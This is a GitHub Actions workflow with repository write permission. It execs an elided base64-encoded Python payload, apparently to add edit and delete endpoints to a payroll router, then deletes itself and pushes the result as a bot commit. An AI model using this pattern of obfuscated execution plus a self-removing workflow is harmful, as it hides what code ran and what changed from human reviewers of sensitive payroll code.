name: Add payroll daily edit delete

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/add-payroll-daily-edit-delete.yml'

permissions:
  contents: write

jobs:
  migrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Add payroll daily edit delete endpoints
        run: python -c "import base64;exec(base64.b64decode(' cHV...').decode())"
      - run: python -m py_compile app/routers/payroll.py
      - name: Commit changes and remove workflow
        run: |
          rm .github/workflows/add-payroll-daily-edit-delete.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add app/routers/payroll.py .github/workflows/add-payroll-daily-edit-delete.yml
          git commit -m "feat: 給与日次データの修正削除APIを追加"
          git push
